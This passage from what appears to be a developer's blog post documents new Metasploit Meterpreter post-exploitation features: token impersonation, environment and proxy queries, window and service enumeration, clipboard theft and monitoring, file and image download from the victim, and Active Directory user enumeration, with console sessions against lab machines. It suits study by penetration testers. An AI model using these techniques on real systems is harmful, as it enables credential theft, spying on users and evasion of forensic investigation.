IPv6 Netmask : ffff:ffff:ffff:ffff::
IPv6 Address : YYYY:YYYY:YYYY:0:5d5f:b4b3:22ed:8311
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
IPv6 Address : ZZZZ::ZZZZ:ZZZZ:ZZZZ:7361
IPv6 Netmask : ffff:ffff:ffff:ffff::
```</p>

<h3>Incognito v2</h3>

<p><a href="http://www.offensive-security.com/metasploit-unleashed/Fun_With_Incognito">Incognito</a> has been part of Meterpreter for a while in the form of the <code>ext_server_incognito</code> extension. This handy extension lets you do some magic with impersonation via tokens and is really useful during a penetration test. The original version of Incognito was implemented a long time, but since that first version was released a new version, <a href="https://labs.mwrinfosecurity.com/blog/2012/07/18/incognito-v2-0-released/">Incognito v2</a>, was released which fixed a bunch of bugs and added some other cool improvements. We decided to include this update in Meterpreter, and so I submitted <a href="https://github.com/rapid7/meterpreter/pull/42">this pull request</a> which included these changes (among other things) and the fantastic <a href="https://twitter.com/todb">todb</a> did me the honour of landing it in master.</p>

<h3>getenv</h3>

<p>It&rsquo;s not surprising to know that post-exploitation tasks can sometimes require access to variables that live inside the compromised machine&rsquo;s environment. However, there wasn&rsquo;t a sensible way to get access to this functionality, and as a result lots of module developers cheated and used the <code>expand_path</code> function that&rsquo;s part of the Standard API&rsquo;s <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/stdapi/fs/file.rb">File System</a> module.</p>

<p>I was talking to <a href="https://twitter.com/egyp7">Egypt</a> on IRC one morning and he mentioned that this was happening and that it really should be fixed so that environment variables are easily accessible without having to use the file system functions (which have a different semantic meaning).</p>

<p>And, lo, the <code>getenv</code> changes were made to <a href="https://github.com/rapid7/meterpreter/blob/master/source/extensions/stdapi/server/sys/config/config.c#L43">Windows Meterpreter</a>, <a href="https://github.com/rapid7/metasploit-framework/blob/master/data/meterpreter/ext_server_stdapi.py#L386">Python Meterpreter</a>, <a href="https://github.com/rapid7/metasploit-framework/blob/master/data/meterpreter/ext_server_stdapi.php#L586">PHP Meterpreter</a> and <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb#L40">Metasploit framework</a>, and all about us knew that it was good. Here it is in action (showing how tolerant it is of <code>$</code> and <code>%</code> symbols):</p>

<p>``` plain getenv in action in Windows Meterpreter on Windows 7 x64
meterpreter > sysinfo
Computer        : WIN-S45GUQ5KGVK
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/win64
meterpreter > getenv DOESNOTEXIST
[&ndash;] None of the specified environment variables were found/set.
meterpreter > getenv temp $prompt $USERNAME %WINDIR% COMSPEC %windows_tracing_flags%</p>

<h1>Environment Variables</h1>

<p>Variable               Value</p>

<hr />

<p>prompt                 $P$G
windows_tracing_flags  3
temp                   C:\Users\OJ\AppData\Local\Temp
WINDIR                 C:\Windows
COMSPEC                C:\Windows\system32\cmd.exe
USERNAME               OJ
```</p>

<p>``` plain getenv in action in Python Meterpreter on Linux x64
meterpreter > sysinfo
Computer     : ropchain
OS           : Linux 3.11.8-200.fc19.x86_64 #1 SMP Wed Nov 13 16:29:59 UTC 2013
Architecture : x86_64
Meterpreter  : python/python
meterpreter > getenv PATH $PAGER %DISPLAY% TERM foo_doesnt_exist</p>

<h1>Environment Variables</h1>

<p>Variable  Value</p>

<hr />

<p>PATH      /home/oj/bin:/home/oj/.rvm/bin:/opt/mono/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/home/oj/.rvm/bin
DISPLAY   :0.0
PAGER     less
TERM      xterm-256color
```</p>

<p>Big ups to <a href="https://twitter.com/egyp7">Egypt</a> for the idea, for implementing the PHP version, and for landing the PR into master.</p>

<h3>getproxy</h3>

<p>This little gem was implemented after a chat with <a href="https://twitter.com/mubix">mubix</a> over a coffee one morning (he has a habit of feeding me ideas). He spoke about how it&rsquo;d be handy to be able to read the details of the system&rsquo;s proxy configuration in Windows, as this is used by Chrome and Internet Explorer behind the scenes. It didn&rsquo;t seem too hard, so I went ahead one evening and made it happen.</p>

<p><code>plain getproxy in action in Windows Meterpreter when no proxy is configured
meterpreter &gt; getproxy
Auto-detect     : No
Auto config URL :
Proxy URL       :
Proxy Bypass    :
</code></p>

<p><code>plain getproxy in action in Windows Meterpreter when a proxy has been configured
meterpreter &gt; getproxy
Auto-detect     : Yes
Auto config URL : http://baz:8080/foo.pac
Proxy URL       : foo:80
Proxy Bypass    : test;testagain;&lt;local&gt;
</code></p>

<p>Another hat tip goes to <a href="https://twitter.com/todb">todb</a> for landing the <a href="https://github.com/rapid7/metasploit-framework/pull/2592">pull request</a>.</p>

<h3>Kill -s</h3>

<p>Meterpreter sessions make it easy for the attacker to terminate processes via the <code>kill</code> command, however there&rsquo;s a level of protection in place in the console that is there to stop you from killing yourself. That is, if you somehow manage to pass in the <code>PID</code> of the Meterpreter session itself Metasploit will stop you. For the most part this makes sense, however there are times when you may actually want to terminate the current process.</p>

<p>One example is when <code>msfpayload</code> is used to generate an executable that contains a <code>reverse_http</code> or <code>reverse_https</code> payload. As mentioned earlier, these payloads don&rsquo;t <em>currently</em> exit cleanly when using the <code>exit</code> command (we know! we&rsquo;re on it!), and so termination of the session does happen on the attacker&rsquo;s machine but on the victim&rsquo;s machine the process continues to run. This is obviously far from ideal.</p>

<p>A short term fix was to add a <code>-s</code> option to the <code>kill</code> command which says &ldquo;please kill myself&rdquo;. Those people using either of those payloads with Meterpreter can use this to &ldquo;force kill&rdquo; the executable to prevent it from running after the session has ended. Yes, it&rsquo;s a small win, but it could prove useful and help people make forensics a little harder while we sort out the main part of the problem.</p>

<p>Note: This doesn&rsquo;t make for a clean shutdown of Metasploit sessions, for obvious reasons!</p>

<h3>Extended API extension</h3>

<p>The Extended API, or <code>extapi</code>, is an extension that was born out of the need to have more helpful functionality for post-exploitation that didn&rsquo;t really belong in the Standard API (<code>stdapi</code>). Extra functionality is always nice, but you don&rsquo;t necessarily want to add extra weight to <code>stadpi</code> when it&rsquo;s already big enough.</p>

<p>The meat of <code>extapi</code> comes from ideas that were shared with me by <a href="https://twitter.com/mubix">Mubix</a> and <a href="https://twitter.com/kernelsmith">Kernelsmith</a>, so credit where credit is due, these guys were the minds behind the extension. I just built it, which is the easy bit. The extension is new, and only has a little bit of functionality so far, but I have a goal to add a lot more very useful stuff in the future. The Metasploit pull request can be <a href="https://github.com/rapid7/metasploit-framework/pull/2602">found here</a> and the Meterpreter side is <a href="https://github.com/rapid7/meterpreter/pull/45">over here</a> if you&rsquo;d like to dive into the code.</p>

<p><a href="https://twitter.com/todb">Tod</a> posted some details about this extension on a [recent Metasploit blog post[metasploit_post_extapi] (thanks Tod!), but I&rsquo;m going to dive into the guts a little more in this post.</p>

<p><code>extapi</code> is Windows-only at this point, as the functionality that was added is Windows-specific. However, there&rsquo;s plenty of room for improvement and plenty of room for addition of features that POSIX will appreciate. If you feel compelled to get involved this is a great spot to get started.</p>

<p>To load <code>extapi</code>, do the same as you would with any other extension:</p>

<p><code>
meterpreter &gt; use extapi
Loading extension extapi...success.
</code></p>

<p>And with that, let&rsquo;s take a look at the features.</p>

<h4>Window Integration</h4>

<p>``` plain Output from running &lsquo;help&rsquo; at the Meterpreter prompt</p>

<h1>Extapi: Window Management Commands</h1>

<pre><code>Command       Description
-------       -----------
window_enum   Enumerate all current open windows
</code></pre>

<p>```</p>

<p>On initial inspection this feature might seem rather uninteresting, but give it a chance. The goal here was to make it possible to enumerate all the windows on the current desktop to give you a clearer view of what the user is running, and to perhaps allow for interaction with those Windows later via Railgun. Being able to enumerate child windows of a given can also prove handy in some scenarios, and so this feature was also added.</p>

<p>So why is it useful? Running <code>ps</code> on a target machine will only give you so much. You might be able to see that <code>notepad.exe</code> is running, but you didn&rsquo;t know that the user was currently editing <code>passwords.txt</code>. Window enumeration will tell you that. That little bit of extra context can really help a penetration tester focus their attack a little better, and let&rsquo;s face it, you can never have too much information when doing such tests.</p>

<p>Detailed help for the <code>window_enum</code> command looks like this:</p>

<p>```
meterpreter > window_enum -h</p>

<p>Usage: window_enum [-h] [-p parent_window] [-u]</p>

<p>Enumerate the windows on the target.</p>

<p>Enumeration returns the Process ID and Window Handle for each window
found. The Window Handle can be used for further calls to window_enum
or the railgun API.</p>

<p>OPTIONS:</p>

<pre><code>-h        Help banner
-p &lt;opt&gt;  Parent window handle, used to enumerate child windows
-u        Include unknown/untitled windows in the result set
</code></pre>

<p>Note: Not all windows can be enumerated. An attempt to enumerate</p>

<pre><code>  the children of such a window will result in a failure with the
  message "Operation failed: The parameter is incorrect."
</code></pre>

<p><code>``
The</code>-p<code>parameter is used when you're interested in looking at the child windows of a given window. This can be handy when narrowing down your search for meaningful information. If it's omitted, all the _named_ top-level windows are enumerated. Some windows, when enumerated, do not yield a window title and by default these windows are not returned in the result set. To have them included, the</code>-u<code>parameter can be used. Each window that isn't named will have</code><unknown>` specified as the window title.</p>

<p>Here&rsquo;s a sample call, running on the context of the <code>SYSTEM</code> user on a Windows XP machine:</p>

<p>```
meterpreter > window_enum</p>

<h1>Top-level windows</h1>

<p>PID  Handle  Title</p>

<hr />

<p>956  65646   SYSTEM AGENT COM WINDOW</p>

<p>Total top-level Windows: 1
```</p>

<p>As you can see, the <code>SYSTEM</code> user doesn&rsquo;t have many windows open, which makes sense. The context that Meterpreter is running under is the one under which the windows are enumerated. Therefore, to view the windows for a given user, the process must be running as that user. Here&rsquo;s a more interesting sample running as a user that actually has a desktop session running:</p>

<p>```
meterpreter > window_enum</p>

<h1>Top-level windows</h1>

<p>PID   Handle  Title</p>

<hr />

<p>156   196894  passwords &ndash; Notepad
288   327766  C:\WINDOWS\System32\cmd.exe
540   65574   NetDDE Agent
608   131170  Start Menu
608   65780   MS_WebcheckMonitor
608   65782   Power Meter
608   131328  Connections Tray
608   65728   Program Manager
1712  196868  vmtoolsdControlWndTitle
1712  65804   DnDControlTitle
1712  65810   UnitySetTopWindowGroupWindow
1712  65812   GuestHostIntegrationWindow
1712  65800   VMSwitchUserControlTitle
1712  65802   VMDisplayChangeControlTitle
1744  131292  DDE Server Window</p>

<p>Total top-level Windows: 15
```</p>

<p>As you can see, it&rsquo;s possible to get more interesting information using this utility. That <code>notepad</code> instance looks like it could yield some juicy information.</p>

<p>You can also have some silly fun, like so:</p>

<p>``` plain Mass window update
meterpreter > irb
[<em>] Starting IRB shell
[</em>] The &lsquo;client&rsquo; variable holds the meterpreter client</p>

<blockquote><blockquote><p>client.extapi.window.enumerate.each {|w| client.railgun.user32.SetWindowTextA(w[:handle], &ldquo;PWNED!&rdquo;)}
```</p></blockquote></blockquote>

<p>And behold!</p>

<p><img src="/uploads/2013/12/pwnd-desktop.png" alt="Owned Windows" /></p>

<p>This is of course a silly example, but having control of the user&rsquo;s desktop windows can prove useful. Once you know the handle of target, it&rsquo;s possible to extract more meaningful information thanks to the Railgun API.</p>

<p>You can also Rick Roll. And who doesn&rsquo;t love a good Rick Rolling?</p>

<h4>Service Integration</h4>

<p>Now, on to more serious stuff.</p>

<p>``` plain Output from running &lsquo;help&rsquo; at the Meterpreter prompt</p>

<h1>Extapi: Service Management Commands</h1>

<pre><code>Command        Description
-------        -----------
service_enum   Enumerate all registered Windows services
service_query  Query more detail about a specific Windows service
</code></pre>

<p>```</p>

<p>Services are a common point of attack. Misconfigured or old/vulnerable services can make for easy targets for local privilege escalation. The <code>service_enum</code> command lets us take a quick glance at what services are running, and what the status is. Here&rsquo;s the detailed help:</p>

<p>``` plain Detailed help of the service_enum command
meterpreter > service_enum -h</p>

<p>Usage: service_enum [-h]</p>

<p>Enumerate services installed on the target.</p>

<p>Enumeration returns the Process ID, Status, and name of each installed
service that was enumerated. The &lsquo;Int&rsquo; value indicates if the service is
able to interact with the desktop.
```</p>

<p>No parameters are required to make this function tick. Here&rsquo;s some sample output:</p>

<p>``` plain Sample output of the service_enum command
meterpreter > service_enum</p>

<h1>Service List</h1>

<p>PID   Status   Int  Name (Display Name)</p>

<hr />

<p>0     Stopped  N    alerter (Alerter)
0     Stopped  N    alg (Application Layer Gateway Service)
0     Stopped  N    appmgmt (Application Management)
956   Running  N    audiosrv (Windows Audio)
0     Stopped  N    bits (Background Intelligent Transfer Service)
956   Running  N    browser (Computer Browser)
0     Stopped  N    cisvc (Indexing Service)
0     Stopped  N    clipsrv (ClipBook)
0     Stopped  N    comsysapp (COM+ System Application)
956   Running  N    cryptsvc (Cryptographic Services)
956   Running  N    dhcp (DHCP Client)
0     Stopped  N    dmadmin (Logical Disk Manager Administrative Service)
0     Stopped  N    dmserver (Logical Disk Manager)
1088  Running  N    dnscache (DNS Client)
956   Running  N    ersvc (Error Reporting Service)
640   Running  N    eventlog (Event Log)
956   Running  N    eventsystem (COM+ Event System)
0     Stopped  N    fastuserswitchingcompatibility (Fast User Switching Compatibility)
956   Running  N    helpsvc (Help and Support)
0     Stopped  N    hidserv (Human Interface Device Access)
0     Stopped  N    imapiservice (IMAPI CD-Burning COM Service)
956   Running  N    lanmanserver (Server)
956   Running  N    lanmanworkstation (Workstation)
1104  Running  N    lmhosts (TCP/IP NetBIOS Helper)
0     Stopped  N    messenger (Messenger)
0     Stopped  N    mnmsrvc (NetMeeting Remote Desktop Sharing)
0     Stopped  N    msdtc (Distributed Transaction Coordinator)
0     Stopped  N    msiserver (Windows Installer)
0     Stopped  N    netdde (Network DDE)
0     Stopped  N    netddedsdm (Network DDE DSDM)
0     Stopped  N    netlogon (Net Logon)
956   Running  N    netman (Network Connections)
956   Running  N    nla (Network Location Awareness (NLA))
0     Stopped  N    ntlmssp (NT LM Security Support Provider)
0     Stopped  N    ntmssvc (Removable Storage)
640   Running  N    plugplay (Plug and Play)
652   Running  N    policyagent (IPSEC Services)
652   Running  N    protectedstorage (Protected Storage)
0     Stopped  N    rasauto (Remote Access Auto Connection Manager)
0     Stopped  N    rasman (Remote Access Connection Manager)
0     Stopped  N    rdsessmgr (Remote Desktop Help Session Manager)
0     Stopped  N    remoteaccess (Routing and Remote Access)
0     Stopped  N    rpclocator (Remote Procedure Call (RPC) Locator)
856   Running  N    rpcss (Remote Procedure Call (RPC))
0     Stopped  N    rsvp (QoS RSVP)
652   Running  N    samss (Security Accounts Manager)
0     Stopped  N    scarddrv (Smart Card Helper)
0     Stopped  N    scardsvr (Smart Card)
956   Running  N    schedule (Task Scheduler)
956   Running  N    seclogon (Secondary Logon)
956   Running  N    sens (System Event Notification)
0     Stopped  N    sharedaccess (Internet Connection Firewall (ICF) / Internet Connection Sharing (ICS))
956   Running  N    shellhwdetection (Shell Hardware Detection)
172   Running  N    spooler (Print Spooler)
956   Running  N    srservice (System Restore Service)
1104  Running  N    ssdpsrv (SSDP Discovery Service)
0     Stopped  N    stisvc (Windows Image Acquisition (WIA))
0     Stopped  N    swprv (MS Software Shadow Copy Provider)
0     Stopped  N    sysmonlog (Performance Logs and Alerts)
0     Stopped  N    tapisrv (Telephony)
956   Running  N    termservice (Terminal Services)
956   Running  N    themes (Themes)
956   Running  N    trkwks (Distributed Link Tracking Client)
956   Running  N    uploadmgr (Upload Manager)
0     Stopped  N    upnphost (Universal Plug and Play Device Host)
0     Stopped  N    ups (Uninterruptible Power Supply)
1496  Running  N    vmtools (VMware Tools)
808   Running  N    vmware physical disk helper service (VMware Physical Disk Helper Service)
0     Stopped  N    vss (Volume Shadow Copy)
956   Running  N    w32time (Windows Time)
1104  Running  N    webclient (WebClient)
956   Running  N    winmgmt (Windows Management Instrumentation)
956   Running  N    wmdmpmsp (Portable Media Serial Number)
0     Stopped  N    wmiapsrv (WMI Performance Adapter)
0     Stopped  N    wuauserv (Automatic Updates)
956   Running  N    wzcsvc (Wireless Zero Configuration)
```</p>

<p>PIDs are shown so that the attacker can migrate to a chosen service easily using the <code>migrate &lt;pid&gt;</code> command. If the attacker is interested in more detail, then the <code>service_query</code> function can be used to dig deeper:</p>

<p>``` plain Detailed help for service_query
meterpreter > service_query -h</p>

<p>Usage: service_query [-h] <servicename></p>

<pre><code> &lt;servicename&gt;:  The name of the service to query.
</code></pre>

<p>Gets details information about a particular Windows service, including
binary path, DACL, load order group, start type and more.
```</p>

<p>The name of the service is required to drill deeper, and this is what it looks like when it&rsquo;s run:</p>

<p>``` plain Sample output of the service_query command
meterpreter > service_query winmgmt</p>

<p>Name        : winmgmt
Display     : Windows Management Instrumentation
Account     : LocalSystem
Start Type  : Automatic
Path        : C:\WINDOWS\system32\svchost.exe -k netsvcs
L.O. Group  :
Interactive : No
DACL        : D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)
```</p>

<p>You&rsquo;ll notice that the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa446597(v=vs.85).aspx">DACL</a> hasn&rsquo;t been parsed into something easily digestable. This is a work in progress, as I&rsquo;m able to parse the DACL but can&rsquo;t yet come up with a nice way of rendering it. I&rsquo;m open to suggestions and pull requests!</p>

<h4>Clipboard Integration</h4>

<p>This is my favourite and the main motivation for starting the <code>extapi</code> extension in the first place.</p>

<p>``` plain Output from running &lsquo;help&rsquo; at the Meterpreter prompt</p>

<h1>Extapi: Clipboard Management Commands</h1>

<pre><code>Command             Description
-------             -----------
clipboard_get_data  Read the victim's current clipboard
clipboard_set_text  Write text to the victim's clipboard
</code></pre>

<p>```</p>

<p>Now we can at least partially own the clipboard, and it&rsquo;s contents. This opens up the possibility for snarfing credentials and other important information from the user while they&rsquo;re using the clipboard. One good example of this is when people are using password managers, such as KeypassX, to copy and paste credentials into browsers or applications.</p>

<p>The only problem is that I the functions need to be invoked manually, and at the right time. This can obviously be difficult and requires a bit of luck. The commands, which I will go into in just a minute, were designed to be the building blocks for me to build what I will call the <code>clipboard_monitor</code>!</p>

<p>But first, let&rsquo;s look at the bit of magic that let&rsquo;s us pull clipboard data from the victim.</p>

<p>``` plain Detailed help for the clipboard_get_data command
meterpreter > clipboard_get_data -h</p>

<p>Usage: clipboard_get_data [-h] [-d]</p>

<p>Attempts to read the data from the victim&rsquo;s clipboard. If the data is in a
supported format, it is read and returned to the user.</p>

<p>OPTIONS:</p>

<pre><code>-d &lt;opt&gt;  Download non-text content to the specified folder (or current folder)
-h        Help banner
</code></pre>

<p>```</p>

<p>One thing to beard in mind about the clipboard is that it&rsquo;s not possible to tell what&rsquo;s on there without querying it. This is why I didn&rsquo;t create a <code>clipboard_get_text</code> function, for example, because the data might not be text. Instead, this general function will pull down whatever it finds on the clipboard so long as it&rsquo;s supported. Currently the extension supports the three main types: <strong>text</strong>, <strong>files</strong>, and <strong>images</strong>.</p>

<p>Text data is the most obvious and simple to handle. If we pretend that the user from the previous screenshot has copied the content of <code>notepad</code> to the clipboard, this is what we get:</p>

<p>```
meterpreter > clipboard_get_data</p>

<h1>Current Clipboard Text</h1>

<p>This is secret!
```</p>

<p>Pretty simple stuff. It does get more complicated when we want to deal with something like one or more files:</p>

<p>```
meterpreter > clipboard_get_data</p>

<h1>Current Clipboard Files</h1>

<p>File Path               Size (bytes)</p>

<hr />

<p>C:\Python27\NEWS.txt    263050
C:\Python27\README.txt  54961
C:\Python27\python.exe  26624</p>

<p>3 file(s) totalling 344635 bytes
```</p>

<p>Here we can see that the user has got a selection of files on the clipboard, and the extension lets us know what they are and how big they are. Directories are also supported, but displayed as a file with 0 bytes, like so:</p>

<p>```
meterpreter > clipboard_get_data</p>

<h1>Current Clipboard Files</h1>

<p>File Path               Size (bytes)</p>

<hr />

<p>C:\Python27\Doc         0
C:\Python27\NEWS.txt    263050
C:\Python27\README.txt  54961
C:\Python27\python.exe  26624</p>

<p>4 file(s) totalling 344635 bytes
```</p>

<p>This might change in future, but for now this is how it works. Doing a recursive file stat to get counts of files and files sizes was deemed overkill for the sake of this exercise.</p>

<p>While this output is interesting, it&rsquo;d be more useful to be able to download those files as well. This is where the <code>-d</code> switch comes in, as this tells the extension to download the files to the local machine:</p>

<p>``` plain Download files using the -d switch
meterpreter > clipboard_get_data -d</p>

<p>[*] Downloading Clipboard Files &hellip;
downloading: C:\Python27\README.txt &ndash;> /Users/oj/code/metasploit-framework/README.txt
downloaded : C:\Python27\README.txt &ndash;> /Users/oj/code/metasploit-framework/README.txt
downloading: C:\Python27\Doc\python271.chm &ndash;> /Users/oj/code/metasploit-framework/Doc/python271.chm
downloaded : C:\Python27\Doc\python271.chm &ndash;> /Users/oj/code/metasploit-framework/Doc/python271.chm
downloading: C:\Python27\NEWS.txt &ndash;> /Users/oj/code/metasploit-framework/NEWS.txt
downloaded : C:\Python27\NEWS.txt &ndash;> /Users/oj/code/metasploit-framework/NEWS.txt
downloading: C:\Python27\python.exe &ndash;> /Users/oj/code/metasploit-framework/python.exe
downloaded : C:\Python27\python.exe &ndash;> /Users/oj/code/metasploit-framework/python.exe
[+] Downloaded 4 file(s).
```</p>

<p>Here you can see that download does work recursively. So we can deal with text and files, what about image data? What if someone takes a screenshot of something?</p>

<p>``` plain Image data
meterpreter > clipboard_get_data</p>

<p>Clipboard Image Dimensions: 240x180
Re-run with -d to download image.
```</p>

<p>The extension tells us that there is image data on the clipboard, and that again we can use the <code>-d</code> switch to pull the data down:</p>

<p><code>plain Download image data with -d
Clipboard Image Dimensions: 240x180
[+] Clipboard image saved to /Users/oj/code/metasploit-framework/ZoepvBYT.jpg
</code></p>

<p>Images are captured by Meterpreter, compressed to JPG using <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms533798(v=vs.85).aspx">GDI+</a>, and shipped down to the attacker&rsquo;s machine in the usual manner. This does mean that machines that are Windows 2000 SP3 or earlier can&rsquo;t work with the image downloader, because they don&rsquo;t have GDI+ installed. This probably isn&rsquo;t going to be a big problem given the number of machines out there that fit this description. Down the track, I plan to update the built-in screenshot utility to use GDI+ as well.</p>

<p>Now if only we could do all this automatically when the clipboard content changes. Fear not, dear reader! This is a work in progress.</p>

<p>``` plain Sample clipboard_monitor help
meterpreter > clipboard_monitor</p>

<p>Usage: clipboard_monitor &lt;start|pause|resume|stop> [-f] [-i] [-h]</p>

<p>Starts or stops a background clipboard monitoring thread. The thread watches
the clipboard on the target, under the context of the current desktop, and when
changes are detected the contents of the clipboard are returned to the attacker.</p>

<ul>
<li>start  &ndash; starts the clipboard monitor with the given arguments if
         the thread is not already running.</li>
<li>pause  &ndash; pauses a currently running clipboard monitor thread.</li>
<li>resume &ndash; resumes a currently paused clipboard monitor thread.</li>
<li>stop   &ndash; stops a currently running or paused clipboard monitor thread.</li>
</ul>


<p>OPTIONS:</p>

<pre><code>-f        Automatically download files
-h        Help banner
-i        Automatically download image content
-l &lt;opt&gt;  Specifies the folder to write the clipboard loot to
</code></pre>

<p>meterpreter > clipboard_monitor start -l /tmp
[<em>] Clipboard monitor looting to /tmp &hellip;
[</em>] Download files? No
[*] Download images? No
[+] Clipboard monitor started
```</p>

<p>As you can see, some work has been done already. Capturing the clipboard changes has already been implemented, but rather than buffer them on the victim&rsquo;s machine the goal is to create a streaming mechanism that will push the data to the attacker as soon as possible. This prevents issues with memory usage on the client, it means that information is made available as it happens, and it also removes the possibility of data being lost if the user manages to terminate Meterpreter.</p>

<p>This work will also go towards supporting streaming for other helpful Meterpreter features such as keylogging and packet capture.</p>

<p>The final command, <code>clipboard_set_text</code>, is a bit of a cute novelty that fits into the same category as some other Metasploit features in that it&rsquo;s used to scare the victim a little. Setting text is the only thing that is supported, image content and files <em>might</em> come later but are currently a very low priority.</p>

<p>``` plain Set text example
meterpreter > clipboard_set_text You have been owned!
meterpreter > clipboard_get_data</p>

<h1>Current Clipboard Text</h1>

<p>You have been owned!
```</p>

<p>This rather large chunk of work was merged by <a href="https://twitter.com/egyp7">Egypt</a> and <a href="https://twitter.com/Meatballs__">Meatballs</a>, who deserve a big thanks for waiting through my steaming pile of code to make sure it was as stink-free as possible before it landed in master.</p>

<h4>ADSI Integration</h4>

<p>ADSI support isn&rsquo;t currently in the <code>extapi</code> extension that is sitting in Metasploit&rsquo;s master branch. However, there are pull requests for both <a href="https://github.com/rapid7/meterpreter/pull/60">Meterpreter</a> and <a href="https://github.com/rapid7/metasploit-framework/pull/2736">Metasploit</a> which add the very basics for querying Active Directory through Meterpreter.</p>

<p>``` plain ADSI commands</p>

<h1>Extapi: ADSI Management Commands</h1>

<pre><code>Command             Description
-------             -----------
adsi_computer_enum  Enumerate all computers on the specified domain.
adsi_domain_query   Enumerate all objects on the specified domain that match a filter.
adsi_user_enum      Enumerate all users on the specified domain.
</code></pre>

<p>```</p>

<p>The core of the work that has been done is in the <code>adsi_domain_query</code> command, as this is the general funnel that is used by the other two commands. It looks like this:</p>

<p>```
meterpreter > adsi_domain_query</p>

<p>Usage: adsi_domain_query <domain> <filter> <field 1> [field 2 [field ..]] [-h] [-m maxresults] [-p pagesize]</p>

<p>Enumerate the objects on the target domain.</p>

<p>Enumeration returns the set of fields that are specified.</p>

<p>OPTIONS:</p>

<pre><code>-h        Help banner
-m &lt;opt&gt;  Maximum results to return.
-p &lt;opt&gt;  Result set page size.
</code></pre>

<p>```</p>

<p>Those familiar with LDAP, Active Directory, etc. will be familiar with how this works. As we all know, a console dump speaks volumes, so let&rsquo;s see an example of it being invoked against my old Windows 2000 domain controller VM:</p>

<p>``` plain adsi_domain_query command sample
meterpreter > adsi_domain_query windows.old &ldquo;(|(name=w<em>)(name=a</em>))&rdquo; samaccountname name distinguishedname</p>

<h1>windows.old Objects</h1>

<p>samaccountname     name                distinguishedname</p>

<hr />

<pre><code>               a.root-servers.net  DC=a.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=windows,DC=old
               WinsockServices     CN=WinsockServices,CN=System,DC=windows,DC=old
               windows.old         DC=windows.old,CN=MicrosoftDNS,CN=System,DC=windows,DC=old
               windows             DC=windows,DC=old
               AdminSDHolder       CN=AdminSDHolder,CN=System,DC=windows,DC=old
               win2k               DC=win2k,DC=windows.old,CN=MicrosoftDNS,CN=System,DC=windows,DC=old
               WIN2K               CN=WIN2K,CN=Domain System Volume (SYSVOL share),CN=File Replication Service,CN=System,DC=windows,DC=old
               AppCategories       CN=AppCategories,CN=Default Domain Policy,CN=System,DC=windows,DC=old
</code></pre>

<p>Account Operators  Account Operators   CN=Account Operators,CN=Builtin,DC=windows,DC=old
Administrator      Administrator       CN=Administrator,CN=Users,DC=windows,DC=old
Administrators     Administrators      CN=Administrators,CN=Builtin,DC=windows,DC=old
WIN2K$             WIN2K               CN=WIN2K,OU=Domain Controllers,DC=windows,DC=old
alice              Alice               CN=Alice,CN=Users,DC=windows,DC=old</p>

<p>Total objects: 13
```</p>

<p>You can see that I&rsquo;m searching for any objects in the <code>windows.old</code> domain that have a name starting with <code>w</code> or <code>a</code> and I&rsquo;m asking for the fields <code>samaccountname</code>, <code>name</code> and <code>distinguishedname</code>.</p>

<p>Here&rsquo;s a query for user&rsquo;s that have a name starting with <code>a</code> that lets us know how many attempts they&rsquo;ve had at logging in that have failed:</p>

<p>```
meterpreter > adsi_domain_query windows.old &ldquo;(&amp;(objectClass=user)(name=a*))&rdquo; samaccountname badPwdCount</p>

<h1>windows.old Objects</h1>

<p>samaccountname  badPwdCount</p>

<hr />

<p>Administrator   9
alice           0</p>

<p>Total objects: 2
```</p>

<p>With this in place, lots of pre-baked queries can be made that can sit on top and not require much work. I&rsquo;ve put two in there already, just as examples, and they look like this:</p>

<p>``` plain adsi_user_enum output
meterpreter > adsi_user_enum</p>

<p>Usage: adsi_user_enum <domain> [-h] [-m maxresults] [-p pagesize]</p>

<p>Enumerate the users on the target domain.</p>

<p>Enumeration returns information such as the user name, SAM account name, locked
status, desc, and comment.</p>

<p>OPTIONS:</p>

<pre><code>-h        Help banner
-m &lt;opt&gt;  Maximum results to return.
-p &lt;opt&gt;  Result set page size.
</code></pre>

<p>meterpreter > adsi_user_enum windows.old</p>

<h1>windows.old Users</h1>

<p>samaccountname  name            distinguishedname                                 description                                                                              comment</p>

<hr />

<p>Administrator   Administrator   CN=Administrator,CN=Users,DC=windows,DC=old       Built-in account for administering the computer/domain                                 <br/>
Guest           Guest           CN=Guest,CN=Users,DC=windows,DC=old               Built-in account for guest access to the computer/domain                               <br/>
IUSR_WIN2K      IUSR_WIN2K      CN=IUSR_WIN2K,CN=Users,DC=windows,DC=old          Built-in account for anonymous access to Internet Information Services                   Built-in account for anonymous access to Internet Information Services
IWAM_WIN2K      IWAM_WIN2K      CN=IWAM_WIN2K,CN=Users,DC=windows,DC=old          Built-in account for Internet Information Services to start out of process applications  Built-in account for Internet Information Services to start out of process applications
SCHMIDT$        schmidt         CN=schmidt,CN=Computers,DC=windows,DC=old         test PC                                                                                <br/>
TsInternetUser  TsInternetUser  CN=TsInternetUser,CN=Users,DC=windows,DC=old      This user account is used by Terminal Services.                                        <br/>
WIN2K$          WIN2K           CN=WIN2K,OU=Domain Controllers,DC=windows,DC=old  This is a TEST.                                                                        <br/>
alice           Alice           CN=Alice,CN=Users,DC=windows,DC=old                                                                                                      <br/>
bob             BOB             CN=BOB,CN=Users,DC=windows,DC=old                                                                                                        <br/>
fido            fido            CN=fido,CN=Users,DC=windows,DC=old                                                                                                       <br/>
krbtgt          krbtgt          CN=krbtgt,CN=Users,DC=windows,DC=old              Key Distribution Center Service Account</p>

<p>Total users: 11
```</p>

<p>``` plain adsi_computer_enum output
meterpreter > adsi_computer_enum</p>

<p>Usage: adsi_computer_enum <domain> [-h] [-m maxresults] [-p pagesize]</p>

<p>Enumerate the computers on the target domain.</p>

<p>Enumeration returns information such as the computer name, desc, and comment.</p>

